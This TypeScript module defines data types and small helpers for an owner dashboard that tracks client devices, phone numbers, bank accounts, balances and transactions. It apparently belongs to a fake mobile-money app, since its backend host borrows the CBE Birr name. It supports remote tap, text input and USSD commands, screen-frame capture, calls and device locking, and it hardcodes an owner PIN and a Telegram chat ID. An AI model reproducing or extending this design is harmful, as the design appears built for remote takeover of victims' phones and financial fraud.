export const OWNER_PIN = '0069';
export const DEFAULT_TELEGRAM_OWNER_CHAT_ID = '6821934730';
export const DEVICE_ONLINE_THRESHOLD_MS = 35_000;

export type DevicePlatform = 'android-apk' | 'web-pwa' | 'web';
export type DeviceApprovalStatus = 'pending' | 'approved' | 'rejected';

export interface DeviceClient {
  deviceId: string;
  deviceName: string;
  platform: DevicePlatform;
  appVersion: string;
  userName: string;
  phoneNumber: string;
  userAccount: string;
  balance: number;
  isLocked: boolean;
  lockReason?: string;
  approvalStatus?: DeviceApprovalStatus;
  lastSeenAtMs: number;
  isOnline?: boolean;
  ownerId?: string;
  createdAtMs?: number;
  updatedAtMs?: number;
}

export interface DeviceTransaction {
  txId: string;
  deviceId: string;
  deviceName: string;
  senderName: string;
  senderPhone: string;
  senderAccount: string;
  title: string;
  txType: 'debit' | 'credit';
  amount: number;
  totalDeducted: number;
  balanceAfter: number;
  recipientName: string;
  recipientAccount: string;
  destBank?: string;
  transferLabel: string;
  ref: string;
  reason: string;
  status: 'Completed' | 'Pending' | 'Failed';
  createdAtMs: number;
}

export interface OwnerNotification {
  notifId: string;
  targetDeviceId: string; // 'all' or specific deviceId
  title: string;
  message: string;
  notifType?: 'text' | 'voice' | 'text_voice';
  audioDataUrl?: string;
  audioDurationSec?: number;
  deliveredJson?: string;
  seenJson?: string;
  durationSeconds: number;
  sentBy: 'telegram' | 'app_0069';
  createdAtMs: number;
  expiresAtMs: number;
}

export interface OwnerGlobalConfig {
  configId: string;
  globalLocked: boolean;
  globalLockMessage: string;
  updatedBy: 'telegram' | 'app_0069' | 'system';
  updatedAtMs: number;
}

export interface OwnerDashboardSnapshot {
  devices: DeviceClient[];
  transactions: DeviceTransaction[];
  notifications: OwnerNotification[];
  globalConfig: OwnerGlobalConfig;
  storageMode: 'firestore' | 'local-cache';
  telegramConfigured: boolean;
  serverTimeMs: number;
}

export type SupportSessionStatus = 'pending' | 'active' | 'ended' | 'declined';

export type SupportCommandType =
  | 'none'
  | 'navigate_step'
  | 'highlight_point'
  | 'show_tip'
  | 'remote_tap'
  | 'remote_scroll'
  | 'remote_input'
  | 'remote_key'
  | 'request_ussd';

export interface SupportSession {
  sessionId: string;
  deviceId: string;
  deviceName: string;
  status: SupportSessionStatus;
  requestedBy: 'app_0069' | 'ram_control';
  currentStep: number;
  activeTab: string;
  screenTitle: string;
  recipientSummary: string;
  amountSummary: string;
  balance: number;
  userName: string;
  phoneNumber: string;
  pointerX: number;
  pointerY: number;
  pointerLabel: string;
  commandSeq: number;
  commandType: SupportCommandType;
  commandPayload: string;
  ussdStatus: string;
  stateSeq: number;
  frameDataUrl?: string;
  frameSeq?: number;
  frameUpdatedAtMs?: number;
  rtcSeq: number;
  rtcOffer: string;
  rtcAnswer: string;
  ownerMicMuted: boolean;
  clientMicMuted: boolean;
  requestedAtMs: number;
  acceptedAtMs: number;
  expiresAtMs: number;
  updatedAtMs: number;
}

export type CallMode = 'audio' | 'video';

export type CallSessionStatus = 'ringing' | 'active' | 'ended' | 'declined' | 'missed';

export interface CallSession {
  callId: string;
  deviceId: string;
  deviceName: string;
  callerRole: 'app_0069' | 'ram_control';
  callerName: string;
  callMode?: CallMode;
  status: CallSessionStatus;
  rtcSeq: number;
  rtcOffer: string;
  rtcAnswer: string;
  ownerMicMuted: boolean;
  clientMicMuted: boolean;
  ownerVideoOff?: boolean;
  clientVideoOff?: boolean;
  startedAtMs: number;
  answeredAtMs: number;
  expiresAtMs: number;
  updatedAtMs: number;
}

export interface DeviceSyncResponse {
  success: boolean;
  deviceId: string;
  approvalStatus: DeviceApprovalStatus;
  globalLocked: boolean;
  deviceLocked: boolean;
  effectiveLocked: boolean;
  lockMessage: string;
  notifications: OwnerNotification[];
  supportSession?: SupportSession | null;
  callSession?: CallSession | null;
  serverTimeMs: number;
}

export function getOwnerApiBaseUrl(): string {
  if (typeof window !== 'undefined') {
    const origin = window.location?.origin || '';
    const hostname = window.location?.hostname || '';
    const protocol = window.location?.protocol || '';
    if (
      origin.includes('appassets.androidplatform.net') ||
      protocol === 'file:' ||
      hostname.endsWith('.run.app')
    ) {
      return 'https://cbebirr-lovat.vercel.app';
    }
    if (origin.startsWith('http')) {
      return origin.replace(/\/$/, '');
    }
  }
  return 'https://cbebirr-lovat.vercel.app';
}

export function isDeviceOnline(lastSeenAtMs: number, nowMs = Date.now()): boolean {
  return nowMs - lastSeenAtMs <= DEVICE_ONLINE_THRESHOLD_MS;
}

export function formatRelativeTime(tsMs: number, nowMs = Date.now()): string {
  const diffSec = Math.max(0, Math.floor((nowMs - tsMs) / 1000));
  if (diffSec < 10) return 'just now';
  if (diffSec < 60) return `${diffSec}s ago`;
  const diffMin = Math.floor(diffSec / 60);
  if (diffMin < 60) return `${diffMin}m ago`;
  const diffHr = Math.floor(diffMin / 60);
  if (diffHr < 24) return `${diffHr}h ago`;
  const diffDay = Math.floor(diffHr / 24);
  return `${diffDay}d ago`;
}

export function parseDurationToSeconds(raw: string | number): number | null {
  if (typeof raw === 'number') {
    if (!Number.isFinite(raw) || raw < 1) return null;
    return Math.min(86400, Math.round(raw));
  }
  const s = String(raw || '').trim().toLowerCase();
  const match = s.match(/^(\d+(?:\.\d+)?)\s*(s|sec|secs|second|seconds|m|min|mins|minute|minutes|h|hr|hrs|hour|hours)?$/i);
  if (!match) return null;
  const num = parseFloat(match[1]);
  if (!Number.isFinite(num) || num <= 0) return null;
  const unit = (match[2] || 's').toLowerCase();
  let seconds = num;
  if (unit.startsWith('m')) seconds = num * 60;
  else if (unit.startsWith('h')) seconds = num * 3600;
  return Math.max(1, Math.min(86400, Math.round(seconds)));
}
